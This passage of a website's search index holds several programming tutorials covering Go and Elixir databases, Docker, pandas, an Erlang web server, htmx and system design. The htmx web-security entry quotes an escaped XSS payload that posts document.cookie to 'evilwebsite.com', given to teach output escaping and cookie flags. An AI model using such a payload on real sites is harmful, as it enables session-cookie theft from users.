                content: "Introduction:\nHello, Go developers! As applications grow increasingly complex and data-driven, efficiently managing database interactions becomes crucial. Go, known for its simplicity and performance, provides excellent support for interacting with both SQL and NoSQL databases. This guide will walk you through connecting to various databases, executing CRUD operations, and using ORM tools to streamline your database management tasks in Go.\n1. Connecting to SQL and NoSQL Databases\na. SQL Databases:\nGo uses the database/sql package to connect to SQL databases, which provides a generic interface around SQL (or SQL-like) databases. This package does not provide a database driver, but instead, it allows you to plug in any database driver that conforms to the Go sql package specifications.\nExample - Connecting to PostgreSQL:\nTo connect to a PostgreSQL database, you can use the pq driver. First, ensure you import it alongside database/sql.\nimport ( \"database/sql\" \"fmt\" _ \"github.com/lib/pq\" // The underscore imports the package solely for its side-effects. ) func connectToPostgres() { connStr := \"postgres://username:password@localhost/dbname?sslmode=disable\" db, err := sql.Open(\"postgres\", connStr) if err != nil { log.Fatal(err) } defer db.Close() fmt.Println(\"Successfully connected to PostgreSQL!\") } b. NoSQL Databases:\nConnecting to NoSQL databases varies significantly depending on the database type. For instance, connecting to MongoDB requires using a Go driver specifically for MongoDB, such as mongo-go-driver.\nExample - Connecting to MongoDB:\nimport ( \"context\" \"go.mongodb.org/mongo-driver/mongo\" \"go.mongodb.org/mongo-driver/mongo/options\" \"log\" ) func connectToMongo() { clientOptions := options.Client().ApplyURI(\"mongodb://localhost:27017\") client, err := mongo.Connect(context.TODO(), clientOptions) if err != nil { log.Fatal(err) } err = client.Ping(context.TODO(), nil) if err != nil { log.Fatal(err) } fmt.Println(\"Successfully connected to MongoDB!\") } 2. Performing CRUD Operations\na. CRUD Operations in SQL:\nCRUD operations in SQL databases involve preparing and executing SQL statements. This often includes queries for fetching data, and statements to insert, update, and delete records.\nfunc createEmployee(db *sql.DB, name string, position string) { sqlStatement := `INSERT INTO employees (name, position) VALUES ($1, $2)` _, err := db.Exec(sqlStatement, name, position) if err != nil { log.Fatalf(\"Unable to execute the query. %v\", err) } fmt.Println(\"Inserted a single record\") } b. CRUD Operations in NoSQL:\nIn NoSQL databases like MongoDB, CRUD operations are usually performed using methods provided by the database driver.\nfunc createDocument(collection *mongo.Collection, doc interface{}) { insertResult, err := collection.InsertOne(context.TODO(), doc) if err != nil { log.Fatal(err) } fmt.Println(\"Inserted a single document: \", insertResult.InsertedID) } 3. Using Popular ORM Tools in Go\nObject-Relational Mapping (ORM) tools provide a high-level abstraction for database interactions, which can simplify CRUD operations significantly.\na. GORM:\nGORM is one of the most popular ORM libraries in Go. It supports a broad range of database systems and provides an active record style ORM.\nimport ( \"gorm.io/driver/sqlite\" \"gorm.io/gorm\" ) func main() { db, err := gorm.Open(sqlite.Open(\"test.db\"), \u0026gorm.Config{}) if err != nil { panic(\"failed to connect database\") } // Migrate the schema db.AutoMigrate(\u0026Product{}) // Create db.Create(\u0026Product{Code: \"D42\", Price: 100}) // Read var product Product db.First(\u0026product, 1) // find product with integer primary key db.First(\u0026product, \"code = ?\", \"D42\") // find product with code D42 // Update - update product's price to 200 db.Model(\u0026product).Update(\"Price\", 200) // Delete - delete product db.Delete(\u0026product, 1) } Conclusion:\nMastering database interactions in Go can elevate your backend development, allowing you to build more dynamic and data-intensive applications efficiently. Whether you choose direct SQL interactions or prefer the simplicity of an ORM, Go provides the tools necessary to handle your data needs effectively. As you continue to develop with Go, consider these practices to ensure your applications are robust, maintainable, and performant.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How do I handle database migrations in Go? A: Tools like GORM provide migration capabilities, or you can use standalone migration tools such as Goose or Flyway.\nQ: Can I use Go’s database/sql package with NoSQL databases? A: No, the database/sql package is designed for SQL databases. NoSQL databases require their specific drivers and often provide a completely different API tailored to their unique data models.\nQ: What are the best practices for database connection management in Go? A: Always use connection pooling provided either by the database driver or the ORM, manage timeouts, handle errors gracefully, and close connections when they’re no longer needed.\n"
            }
        );
    index.add(
            {
                id:  256 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/dockerising_elixir\/",
                title: "Using Docker and Elixir",
                description: "Learn how to build a simple cli todo tool using elixir",
                content: "Introduction linkPhoenix is known for its ability to facilitate rapid development of Elixir web services. The Mix tool further enhances productivity by automating repetitive tasks such as compiling code and running tests. Containerization adds another layer of efficiency, especially when deploying applications with supporting infrastructure.\nIn this tutorial, we will explore how to run a Phoenix application using Docker and Docker Compose, and create a custom Mix task to integrate containerization into the Elixir workflow seamlessly.\nGoals linkBy the end of this tutorial, you will:\nBuild a Docker container to run a Phoenix release. Set up an orchestrated multi-container environment with Docker Compose. Create a custom Mix task to automate Docker tasks and simplify containerization. Prerequisites linkTo follow this tutorial, you will need:\nA basic understanding of Docker. Familiarity with Elixir’s Mix tool. Docker and Docker Compose installed on your workstation. Elixir and Phoenix installed on your workstation. A basic Phoenix application (you can create one by following the Phoenix Guides). Setting Up Your Phoenix Application link Create a new Phoenix project:\nmix phx.new my_app cd my_app Set up the database configuration: Edit config/dev.exs and config/prod.exs to configure your database connection.\nCreate the database and run migrations:\nmix ecto.create mix ecto.migrate Building the Phoenix Release link Compile the project:\nMIX_ENV=prod mix compile Create the release:\nMIX_ENV=prod mix release Building a Docker Container link Create a Dockerfile in the root of your project:\nFROM elixir:1.12-alpine RUN apk add --no-cache build-base npm git postgresql-client WORKDIR /app COPY . . RUN mix deps.get --only prod RUN MIX_ENV=prod mix compile RUN npm install --prefix assets RUN npm run deploy --prefix assets RUN MIX_ENV=prod mix phx.digest RUN MIX_ENV=prod mix release CMD [\"_build/prod/rel/my_app/bin/my_app\", \"start\"] Build the Docker image:\ndocker build -t my_app . Run the Docker container:\ndocker run -p 4000:4000 my_app Setting Up Docker Compose link Create a docker-compose.yml file:\nversion: '3' services: web: build: . ports: - \"4000:4000\" depends_on: - db environment: DATABASE_URL: \"ecto://postgres:postgres@db/postgres\" SECRET_KEY_BASE: \"a_secret_key\" db: image: postgres:13 environment: POSTGRES_USER: postgres POSTGRES_PASSWORD: postgres POSTGRES_DB: postgres volumes: - db_data:/var/lib/postgresql/data volumes: db_data: Build and run the services:\ndocker-compose up --build Creating a Custom Mix Task link Create a new Mix task in lib/mix/tasks/compose.ex:\ndefmodule Mix.Tasks.Compose do use Mix.Task @shortdoc \"Run Docker Compose to manage the application containers\" def run(args) do case Mix.shell.cmd(\"docker-compose --version\", quiet: true) do 0 -\u003e compose(args) _ -\u003e Mix.shell.error(\"Docker Compose is not installed. Please install it from https://docs.docker.com/compose/install/\") end end defp compose([\"up\"]) do Mix.shell.cmd(\"docker-compose up --build\") end defp compose([\"down\"]) do Mix.shell.cmd(\"docker-compose down\") end defp compose([\"logs\"]) do Mix.shell.cmd(\"docker-compose logs\") end defp compose(_) do Mix.shell.info(\"Usage: mix compose [up|down|logs]\") end end Use the new Mix task:\nmix compose up mix compose logs mix compose down Conclusion linkIn this tutorial, we have:\nBuilt and run a Docker container for a Phoenix release. Set up a multi-container environment with Docker Compose. Created a custom Mix task to manage Docker tasks. This setup simplifies development and deployment workflows, making it easier to manage your Phoenix applications in a containerized environment.\n"
            }
        );
    index.add(
            {
                id:  257 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/password_generator\/",
                title: "Using Ecto for Database Interactions",
                description: "Elixir is a process-oriented, functional programming language that runs on the Erlang virtual machine (BEAM). The language was influenced by Ruby. This inspiration can be seen and felt in Elixir’s ecosystem and tooling options. Elixir is known to be easy to learn and widely applicable within the software development industry.",
                content: ""
            }
        );
    index.add(
            {
                id:  258 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/using_ecto_for_database_interactions\/",
                title: "Using Ecto for Database Interactions",
                description: "Elixir is a process-oriented, functional programming language that runs on the Erlang virtual machine (BEAM). The language was influenced by Ruby. This inspiration can be seen and felt in Elixir’s ecosystem and tooling options. Elixir is known to be easy to learn and widely applicable within the software development industry.",
                content: "Ecto is a powerful database library and toolkit for Elixir, providing a domain-specific language for interacting with databases. This tutorial covers the essentials of using Ecto, from setting up and configuring your database to writing queries and handling data validation with changesets.\nIntroduction to Ecto linkEcto is an Elixir library for interacting with databases. It allows you to define schemas, run queries, manage database changes through migrations, and validate data. Ecto supports PostgreSQL, MySQL, SQLite, and other databases.\nSetting Up Ecto linkTo start using Ecto in your project, follow these steps:\nAdd Ecto and a database adapter (e.g., PostgreSQL) to your mix.exs dependencies:\ndefp deps do [ {:ecto_sql, \"~\u003e 3.7\"}, {:postgrex, \"\u003e= 0.0.0\"} ] end Fetch the dependencies:\nmix deps.get Generate the Ecto repository:\nmix ecto.gen.repo -r MyApp.Repo Configure the repository in config/config.exs:\nconfig :my_app, MyApp.Repo, username: \"postgres\", password: \"postgres\", database: \"my_app_dev\", hostname: \"localhost\", show_sensitive_data_on_connection_error: true, pool_size: 10 config :my_app, ecto_repos: [MyApp.Repo] Create the repository:\nmix ecto.create Defining Schemas linkSchemas define the structure of your data and how it maps to database tables. Create a schema module using the mix phx.gen.schema task or manually.\nExample of a manually created schema for a User:\nCreate a file lib/my_app/user.ex: defmodule MyApp.User do use Ecto.Schema import Ecto.Changeset schema \"users\" do field :name, :string field :email, :string field :age, :integer timestamps() end def changeset(user, attrs) do user |\u003e cast(attrs, [:name, :email, :age]) |\u003e validate_required([:name, :email, :age]) end end Database Migrations linkMigrations are used to modify the database schema over time. Generate a migration file using the mix ecto.gen.migration task.\nGenerate a migration:\nmix ecto.gen.migration create_users Edit the generated file in priv/repo/migrations/:\ndefmodule MyApp.Repo.Migrations.CreateUsers do use Ecto.Migration def change do create table(:users) do add :name, :string add :email, :string add :age, :integer timestamps() end create unique_index(:users, [:email]) end end Run the migration:\nmix ecto.migrate Writing Queries linkEcto provides a powerful query DSL to interact with your database. You can write queries using the Ecto.Query module.\nBasic query example:\nimport Ecto.Query alias MyApp.Repo alias MyApp.User # Fetch all users users = Repo.all(User) # Fetch a user by ID user = Repo.get(User, 1) # Fetch users with specific criteria query = from u in User, where: u.age \u003e 30 users_above_30 = Repo.all(query) Inserting data:\n%User{name: \"John\", email: \"john@example.com\", age: 25} |\u003e Repo.insert() Updating data:\nuser = Repo.get(User, 1) changeset = User.changeset(user, %{age: 26}) Repo.update(changeset) Deleting data:\nuser = Repo.get(User, 1) Repo.delete(user) Changesets and Data Validation linkChangesets allow you to cast and validate data before performing database operations. They are essential for ensuring data integrity.\nCreating a changeset:\ndef changeset(user, attrs) do user |\u003e cast(attrs, [:name, :email, :age]) |\u003e validate_required([:name, :email, :age]) |\u003e validate_format(:email, ~r/@/) |\u003e validate_number(:age, greater_than: 0) end Using a changeset for insertion:\nattrs = %{name: \"Jane\", email: \"jane@example.com\", age: 28} changeset = User.changeset(%User{}, attrs) case Repo.insert(changeset) do {:ok, user} -\u003e IO.puts(\"User created: #{user.name}\") {:error, changeset} -\u003e IO.inspect(changeset.errors) end Conclusion linkEcto is a comprehensive toolkit for database interactions in Elixir. It simplifies defining schemas, managing database migrations, writing queries, and ensuring data integrity through changesets. By following this tutorial, you can efficiently manage your database operations in Elixir, making your application robust and maintainable.\nHappy coding!\nThis guide should provide a solid foundation for using Ecto in your Elixir projects.\n"
            }
        );
    index.add(
            {
                id:  259 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/viewing_and_understanding_dataframes\/",
                title: "Viewing and Understanding Dataframes",
                description: "In this section, you will be learning more about Dataframes, how to load data into one and how to perform operations.",
                content: "Viewing and Understanding DataFrames Using Pandas linkAfter reading tabular data as a DataFrame, you would need to have a glimpse of the data. You can either view a small sample of the dataset or a summary of the data in the form of summary statistics.\nHow to View Data Using .head() and .tail() linkYou can view the first few or last few rows of a DataFrame using the .head() or .tail() methods, respectively. You can specify the number of rows through the n argument (the default value is 5).\ndf.head() First five rows of the DataFrame (df) using .head()\ndf.tail(n=10) Last 10 rows of the DataFrame using .tail()\nUnderstanding Data Using .describe() linkThe .describe() method prints the summary statistics of all numeric columns, such as count, mean, standard deviation, range, and quartiles of numeric columns.\ndf.describe() Get summary statistics with .describe()\nIt gives a quick look at the scale, skew, and range of numeric data.\nYou can also modify the quartiles using the percentiles argument. Here, for example, we’re looking at the 30%, 50%, and 70% percentiles of the numeric columns in DataFrame df.\ndf.describe(percentiles=[0.3, 0.5, 0.7]) Get summary statistics with specific percentiles\nYou can also isolate specific data types in your summary output by using the include argument. Here, for example, we’re only summarizing the columns with the integer data type.\ndf.describe(include=[int]) Get summary statistics of integer columns only\nSimilarly, you might want to exclude certain data types using the exclude argument.\ndf.describe(exclude=[int]) Get summary statistics of non-integer columns only\nOften, practitioners find it easy to view such statistics by transposing them with the .T attribute.\ndf.describe().T Transpose summary statistics with .T\nUnderstanding Data Using .info() linkThe .info() method is a quick way to look at the data types, missing values, and data size of a DataFrame. Here, we’re setting the show_counts argument to True, which gives an overview of the total non-missing values in each column. We’re also setting memory_usage to True, which shows the total memory usage of the DataFrame elements. When verbose is set to True, it prints the full summary from .info().\ndf.info(show_counts=True, memory_usage=True, verbose=True) Understanding Your Data Using .shape linkThe number of rows and columns of a DataFrame can be identified using the .shape attribute of the DataFrame. It returns a tuple (row, column) and can be indexed to get only rows or only columns count as output.\ndf.shape # Get the number of rows and columns df.shape[0] # Get the number of rows only df.shape[1] # Get the number of columns only Get All Columns and Column Names linkCalling the .columns attribute of a DataFrame object returns the column names in the form of an Index object. As a reminder, a pandas index is the address/label of the row or column.\ndf.columns Output of columns:\nIt can be converted to a list using the list() function.\nlist(df.columns) Checking for Missing Values in Pandas with .isnull() linkThe sample DataFrame does not have any missing values. Let’s introduce a few to make things interesting. The .copy() method makes a copy of the original DataFrame. This is done to ensure that any changes to the copy don’t reflect in the original DataFrame. Using .loc (to be discussed later), you can set rows two to five of the Pregnancies column to NaN values, which denote missing values.\ndf2 = df.copy() df2.loc[2:5, 'Pregnancies'] = None df2.head(7) Rows 2 to 5 are NaN\nYou can check whether each element in a DataFrame is missing using the .isnull() method.\ndf2.isnull().head(7) Given it’s often more useful to know how much missing data you have, you can combine .isnull() with .sum() to count the number of nulls in each column.\ndf2.isnull().sum() Pregnancies 4 Glucose 0 BloodPressure 0 SkinThickness 0 Insulin 0 BMI 0 DiabetesPedigreeFunction 0 Age 0 Outcome 0 dtype: int64 You can also do a double sum to get the total number of nulls in the DataFrame.\ndf2.isnull().sum().sum() 4 "
            }
        );
    index.add(
            {
                id:  260 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/web_development_in_erlang\/",
                title: "Web Programming in Erlang",
                description: "In Erlang, the inets library provides the functionality to build web servers, known as httpd, to handle HTTP requests. This tutorial will guide you through setting up a basic web server in Erlang and implementing a “Hello, World!” web application.\nFeatures of Erlang HTTP Server linkThe Erlang HTTP server (httpd) supports several features:\nSecure Sockets Layer (SSL) Erlang Scripting Interface (ESI) Common Gateway Interface (CGI) User Authentication (using Mnesia, Dets, or plain text database) Common Logfile Format (with or without disk_log support) URL Aliasing Action Mappings Directory Listings Setting Up the Web Server linkStarting the Web Library linkFirst, start the inets library:",
                content: "In Erlang, the inets library provides the functionality to build web servers, known as httpd, to handle HTTP requests. This tutorial will guide you through setting up a basic web server in Erlang and implementing a “Hello, World!” web application.\nFeatures of Erlang HTTP Server linkThe Erlang HTTP server (httpd) supports several features:\nSecure Sockets Layer (SSL) Erlang Scripting Interface (ESI) Common Gateway Interface (CGI) User Authentication (using Mnesia, Dets, or plain text database) Common Logfile Format (with or without disk_log support) URL Aliasing Action Mappings Directory Listings Setting Up the Web Server linkStarting the Web Library linkFirst, start the inets library:\ninets:start(). Implementing the Web Server linkCreate a module to implement the web server process.\nExample link -module(helloworld). -export([start/0]). start() -\u003e inets:start(), {ok, Pid} = inets:start(httpd, [ {port, 8081}, {server_name, \"httpd_test\"}, {server_root, \"D://tmp\"}, {document_root, \"D://tmp/htdocs\"}, {bind_address, \"localhost\"} ]), io:fwrite(\"~p\", [Pid]). Notes link The port parameter specifies the port number on which the httpd service will run. Ensure this port is not used by any other service. The server_root and document_root parameters are mandatory and define the root directories for the server and documents, respectively. Output linkThe output will show the process identifier:\n{ok,\u003c0.42.0\u003e} Creating a “Hello, World!” Web Server linkStep 1: Implement the Server Code linkCreate a module with the following code:\n-module(helloworld). -export([start/0, service/3]). start() -\u003e inets:start(httpd, [ {modules, [ mod_alias, mod_auth, mod_esi, mod_actions, mod_cgi, mod_dir, mod_get, mod_head, mod_log, mod_disk_log ]}, {port, 8081}, {server_name, \"helloworld\"}, {server_root, \"D://tmp\"}, {document_root, \"D://tmp/htdocs\"}, {erl_script_alias, {\"/erl\", [helloworld]}}, {error_log, \"error.log\"}, {security_log, \"security.log\"}, {transfer_log, \"transfer.log\"}, {mime_types, [ {\"html\", \"text/html\"}, {\"css\", \"text/css\"}, {\"js\", \"application/x-javascript\"} ]} ]). service(SessionID, _Env, _Input) -\u003e mod_esi:deliver(SessionID, [ \"Content-Type: text/html\\r\\n\\r\\n\", \"Hello, World!\" ]). Step 2: Compile and Run the Code linkCompile the module and start the server:\n1\u003e c(helloworld). {ok,helloworld} 2\u003e inets:start(). ok 3\u003e helloworld:start(). {ok,\u003c0.50.0\u003e} Step 3: Access the Web Page linkOpen a web browser and navigate to the URL:\nhttp://localhost:8081/erl/helloworld:service You should see the “Hello, World!” message displayed.\nConclusion linkIn this tutorial, we explored how to set up a basic web server in Erlang using the inets library. By following these steps, you can create a simple web application and extend it with more features as needed.\n"
            }
        );
    index.add(
            {
                id:  261 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/web_security_basics_using_htmx\/",
                title: "Web Security Basics using HTMX",
                description: "Learn about what HTMX is and how you can use it.",
                content: "As htmx has gotten more popular, it’s reached communities who have never written server-generated HTML before. Dynamic HTML templating was, and still is, the standard way to use many popular web frameworks—like Rails, Django, and Spring—but it is a novel concept for those coming from Single-Page Application (SPA) frameworks—like React and Svelte—where the prevalence of JSX means you never write HTML directly.\nBut have no fear! Writing web applications with HTML templates is a slightly different security model, but it’s no harder than securing a JSX-based application, and in some ways it’s a lot easier.\nOverview linkThese are web security basics with htmx, but they’re (mostly) not htmx-specific—these concepts are important to know if you’re putting any dynamic, user-generated content on the web.\nFor this guide, you should already have a basic grasp of the semantics of the web, and be familiar with how to write a backend server (in any language). For instance, you should know not to create GET routes that can alter the backend state. We also assume that you’re not doing anything super fancy, like making a website that hosts other people’s websites. If you’re doing anything like that, the security concepts you need to be aware of far exceed the scope of this guide.\nWe make these simplifying assumptions in order to target the widest possible audience, without including distracting information—obviously this can’t catch everyone. No security guide is perfectly comprehensive. If you feel there’s a mistake, or an obvious gotcha that we should have mentioned, please reach out and we’ll update it.\nThe Golden Rules linkFollow these four simple rules, and you’ll be following the client security best practices:\nOnly call routes you control Always use an auto-escaping template engine Only serve user-generated content inside HTML tags If you have authentication cookies, set them with Secure, HttpOnly, and SameSite=Lax In the following section, we’ll discuss what each of these rules does, and what kinds of attack they protect against. The vast majority of htmx users—those using htmx to build a website that allows users to login, view some data, and update that data—should never have any reason to break them.\nUnderstanding the Rules linkOnly call routes you control linkThis is the most basic one, and the most important: do not call untrusted routes with htmx.\nIn practice, this means you should only use relative URLs. This is fine:\nSearch events But this is not:\nSearch events The reason for this is simple: htmx inserts the response from that route directly into the user’s page. If the response has a malicious Fortunately this one is so easy to fix that you can write the code yourself. Whenever you insert untrusted (i.e. user-provided) data, you just have to replace eight characters with their non-code equivalents. This is an example using JavaScript: /** * Replace any characters that could be used to inject a malicious script in an HTML context. */ export function escapeHtmlText (value) { const stringValue = value.toString() const entityMap = { '\u0026': '\u0026amp;', '\u003c': '\u0026lt;', '\u003e': '\u0026gt;', '\"': '\u0026quot;', \"'\": '\u0026#x27;', '/': '\u0026#x2F;', '`': '\u0026grave;', '=': '\u0026#x3D;' } // Match any of the characters inside /[ ... ]/ const regex = /[\u0026\u003c\u003e\"'`=/]/g return stringValue.replace(regex, match =\u003e entityMap[match]) } This tiny JS function replaces \u003c with \u003c, \" with \", and so on. These characters will still render properly as \u003c and \" when they’re used in the text, but can’t be interpreted as code constructs. The previous malicious bio will now be converted into the following HTML:\n\u0026lt;script\u0026gt; fetch(\u0026#x27;evilwebsite.com\u0026#x27;, { method: \u0026#x27;POST\u0026#x27;, data: document.cookie }) \u0026lt;/script\u0026gt; which displays harmlessly as text.\nFortunately, as established above, you don’t have to do your escaping manually—I just wanted to demonstrate how simple these concepts are. Every template engine has an auto-escaping feature, and you’re going to want to use a template engine anyway. Just make sure that escaping is enabled, and send all your HTML through it.\nOnly serve user-generated content inside HTML tags linkThis is an addendum to the template engine rule, but it’s important enough to call out on its own. Do not allow your users to define arbitrary CSS or JS content, even with your auto-escaping template engine.\nAnd, don’t use user-defined attributes or tag names either: \u003c{{ user.tag }}\u003e\u003c/{{ user.tag }}\u003e {{ user.name }} CSS, JavaScript, and HTML attributes are “dangerous contexts,” places where it’s not safe to allow arbitrary user input, even if it’s escaped. Escaping will protect you from some vulnerabilities here, but not all of them; the vulnerabilities are varied enough that it’s safest to default to not doing any of these.\nInserting user-generated text directly into a script tag should never be necessary, but there are some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.\nSecure your cookies linkThe best way to do authentication with htmx is using cookies. And because htmx encourages interactivity primarily through first-party HTML APIs, it is usually trivial to enable the browser’s best cookie security features. These three in particular:\nSecure - only send the cookie via HTTPS, never HTTP HttpOnly - don’t make the cookie available to JavaScript via document.cookie SameSite=Lax - don’t allow other sites to use your cookie to make requests, unless it’s just a plain link To understand what these protect you against, let’s go over the basics. If you come from JavaScript SPAs, where it’s common to authenticate using the Authorization header, you might not be familiar with how cookies work. Fortunately they’re very simple. (Please note: this is not an “authentication with htmx” tutorial, just an overview of cookie tokens generally)\nIf your users log in with a , their browser will send your server an HTTP request, and your server will send back a response that looks something like this:\nHTTP/2.0 200 OK Content-Type: text/html Set-Cookie: token=asd8234nsdfp982 [HTML content] That token corresponds to the user’s current login session. From now on, every time that user makes a request to any route at yourdomain.com, the browser will include that cookie from Set-Cookie in the HTTP request.\nGET /users HTTP/1.1 Host: yourdomain.com Cookie: token=asd8234nsdfp982 Each time someone makes a request to your server, it needs to parse out that token and determine if it’s valid. Simple enough.\nYou can also set options on that cookie, like the ones I recommended above. How to do this differs depending on the programming language, but the outcome is always an HTTP request that looks like this:\nHTTP/2.0 200 OK Content-Type: text/html Set-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax [HTML content] So what do the options do?\nThe first one, Secure, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user’s login token, should never be sent over an insecure connection.\nThe second option, HttpOnly, means that the browser will not expose the cookie to JavaScript, ever (i.e. it won’t be in document.cookie). Even if someone is able to insert a malicious script, like in the evilwebsite.com example above, that malicious script cannot access the user’s cookie or send it to evilwebsite.com. The browser will only attach the cookie when the request is made to the website the cookie came from.\nFinally, SameSite=Lax locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client’s browser to make a malicious request to the yourdomain.com server—like a POST request. The SameSite=Lax setting tells the browser not to send the yourdomain.com cookie if the site that made the request isn’t yourdomain.com—unless it’s a straightforward link navigating to your page. This is mostly browser default behavior now, but it’s important to still set it directly.\n"
            }
        );
    index.add(
            {
                id:  262 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/web_socket_and_sse\/",
                title: "Web Socket and SSE",
                description: "htmx is a library that allows you to access modern browser features directly from HTML, rather than using javascript.",
                content: "htmx has experimental support for declarative use of both WebSockets and Server Sent Events.\nNote: In htmx 2.0, these features will be migrated to extensions. These new extensions are already available in htmx 1.7+ and, if you are writing new code, you are encouraged to use the extensions instead. All new feature work for both SSE and web sockets will be done in the extensions.\nWebSockets linkIf you wish to establish a WebSocket connection in htmx, you use the hx-ws attribute:\n... The connect declaration established the connection, and the send declaration tells the form to submit values to the socket on submit.\nMore details can be found on the hx-ws attribute page\nServer Sent Events linkServer Sent Events are a way for servers to send events to browsers. It provides a higher-level mechanism for communication between the server and the browser than websockets.\nIf you want an element to respond to a Server Sent Event via htmx, you need to do two things:\nDefine an SSE source. To do this, add a hx-sse attribute on a parent element with a connect: declaration that specifies the URL from which Server Sent Events will be received.\nDefine elements that are descendents of this element that are triggered by server sent events using the hx-trigger=“sse:” syntax\nHere is an example:\nDepending on your implementation, this may be more efficient than the polling example above since the server would notify the div if there was new news to get, rather than the steady requests that a poll causes.\n"
            }
        );
    index.add(
            {
                id:  263 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/api_gateway\/",
                title: "What Is an API Gateway?",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "An API gateway is a server that acts as an intermediary between clients and a collection of backend services. It accepts API requests from a client, processes them based on defined policies, routes them to the appropriate services, and aggregates the responses to provide a simplified user experience. An API gateway typically handles requests by invoking multiple microservices and combining their results. It can also translate between protocols in legacy deployments, making it versatile in various architectural setups.\nAPI Gateway Capabilities linkAPI gateways implement several key capabilities:\nSecurity Policy:\nAuthentication: Verifying the identity of the user or service making the request. Authorization: Ensuring the requester has permission to access the requested resource. Access Control: Restricting access to certain resources based on policies. Encryption: Protecting data in transit between clients and services. Routing Policy:\nRouting: Directing requests to the appropriate backend services. Rate Limiting: Controlling the number of requests a client can make in a given timeframe. Request/Response Manipulation: Modifying requests before they reach the service and responses before they return to the client. Circuit Breaker: Preventing repeated requests to failing services. Blue-Green and Canary Deployments: Managing traffic to different versions of services for testing. A/B Testing: Distributing traffic to different service versions to compare performance. Load Balancing: Distributing traffic evenly across multiple service instances. Health Checks: Monitoring service health and rerouting traffic as necessary. Custom Error Handling: Providing customized error responses. Observability Policy:\nReal-time and Historical Metrics: Monitoring performance and usage metrics. Logging: Recording request and response data for analysis. Tracing: Tracking the flow of requests through the system. For enhanced security, API gateways can be augmented with web application firewalls (WAF) and denial-of-service (DoS) protection.\nAPI Gateway Benefits linkDeploying an API gateway offers several advantages:\nReduced Complexity and Faster Releases: Encapsulating internal application architecture and providing APIs tailored for each client type can simplify and accelerate app development and deployment. Centralized Control and Policy Enforcement: Offloading non-functional requirements to the API gateway infrastructure simplifies request processing and policy enforcement. Simplified Troubleshooting: Granular real-time and historical metrics and dashboards aid in monitoring and troubleshooting. API Gateway and Microservices Architecture linkIn a microservices architecture, an API gateway serves as the single entry point for all client requests, simplifying both client implementations and microservices by decoupling the complexity of an app from its clients. It handles:\nRequest Routing: Directing requests to the appropriate microservices. Composition: Combining responses from multiple microservices. Policy Enforcement: Applying security, routing, and observability policies. By managing these responsibilities, the API gateway allows developers to focus on core business logic, speeding up app releases.\nAPI Gateway for Kubernetes linkKubernetes is the standard for deploying and managing containerized applications. Depending on the architecture and delivery requirements, an API gateway can be deployed:\nIn Front of the Kubernetes Cluster: As a load balancer for multi-cluster setups. At the Edge of the Cluster: As an Ingress controller. Within the Cluster: As a service mesh. For deployments at the edge or within the cluster, Kubernetes-native tools like NGINX Ingress Controller and NGINX Service Mesh are recommended for their tight integration with the Kubernetes API.\nAPI Gateway vs. Ingress Controller linkIngress gateways and controllers manage communications between users and applications running in Kubernetes, handling user-to-service (north-south) connectivity. They expose applications to external clients but are limited in capabilities. Many vendors expand Ingress controllers with custom resource definitions (CRDs) to provide more functionality, allowing them to serve as API gateways.\nAPI Gateway vs. Gateway API linkThe Kubernetes Gateway API is an open-source project aimed at improving and standardizing service networking in Kubernetes. It evolved from the Kubernetes Ingress API to address challenges in deploying Ingress resources. Tools built on the Gateway API, like NGINX Kubernetes Gateway, can route requests, implement traffic policies, and enable deployments.\nService Mesh vs. API Gateway linkA service mesh is an infrastructure layer for controlling service-to-service (east-west) communications within a Kubernetes cluster. It offers capabilities like load balancing, authentication, authorization, and observability. While an API gateway handles north-south traffic, a service mesh manages east-west traffic, ensuring secure and reliable communication between services.\nAPI Gateway and API Management linkWhile the terms are often used interchangeably, API gateways and API management serve different functions:\nAPI Gateway: Acts as the data-plane entry point for API calls, performing request processing based on defined policies. API Management: Involves deploying, documenting, operating, and monitoring APIs, typically through management-plane software that defines and applies policies to API gateways and developer portals. An API gateway can be a standalone component or part of an integrated API management solution.\nConsiderations for Choosing an API Gateway linkWhen selecting an API gateway, consider:\nArchitecture: Deployment options and flexibility with cloud providers. Performance: Throughput and latency requirements. Scalability: Ability to scale vertically and horizontally. Security: Support for advanced security features. Cost: Total cost of ownership, including building and maintaining custom solutions versus purchasing enterprise-grade gateways. By carefully evaluating these factors, you can choose an API gateway that meets your application’s specific needs and requirements.\n"
            }
        );
    index.add(
            {
                id:  264 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/caching\/",
                title: "What is Caching?",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "Caching is a high-speed data storage layer that stores a subset of data, typically transient in nature, to serve future requests for that data more quickly than accessing the primary storage location. This allows for efficient reuse of previously retrieved or computed data, significantly enhancing data retrieval performance.\nHow Does Caching Work? linkData in a cache is generally stored in fast-access hardware such as Random-access memory (RAM) and may also work in conjunction with software components. The primary purpose of caching is to increase data retrieval performance by reducing the need to access the slower underlying storage layer.\nSpeed vs. Capacity: Caches trade off capacity for speed, storing a smaller subset of data temporarily, unlike databases that store complete and durable data sets. Caching Overview linkRAM and In-Memory Engines linkCaches utilize RAM and in-memory engines due to their high Input/Output operations per second (IOPS). This results in improved data retrieval performance and cost savings at scale compared to traditional disk-based storage. Supporting the same scale with disk-based systems would require more resources and still fail to achieve the low latency provided by in-memory caches.\nApplications of Caching linkCaching can be applied across various layers of technology, including:\nOperating Systems: Enhancing system performance by storing frequently accessed data. Networking Layers: Including Content Delivery Networks (CDNs) and DNS for faster domain resolution. Web Applications: Reducing latency by caching web artifacts such as HTML, JavaScript, and images. Databases: Improving query performance by caching frequently accessed data. Design Patterns in Caching linkIn distributed computing environments, a 